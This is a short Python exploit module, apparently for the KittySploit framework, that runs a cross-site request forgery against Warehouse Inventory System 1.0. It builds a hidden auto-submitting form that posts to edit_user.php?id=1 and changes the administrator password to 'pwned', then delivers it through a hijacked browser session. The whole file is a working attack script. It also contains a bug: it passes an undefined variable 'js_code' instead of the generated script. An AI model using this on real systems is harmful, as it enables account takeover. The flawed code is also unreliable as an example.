from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": " Warehouse Inventory System 1.0 csrf",
		"description": " Warehouse Inventory System 1.0 change admin password csrf",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target URL (with http://)", required=True)
	password = OptString("pwned", "Change password", required=True)

	
	def run(self):
		data = [f'<form method="POST" action="{self.target}/edit_user.php?id=1">',
			f'<input type="hidden" name="password" value="{self.password}" />',
			f'<input type="hidden" name="update&#45;pass" value="" />',
			f'<input type="submit" value="Submit request" />',
			'</form>']
			
		js = self.csrf_post_and_submit(data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
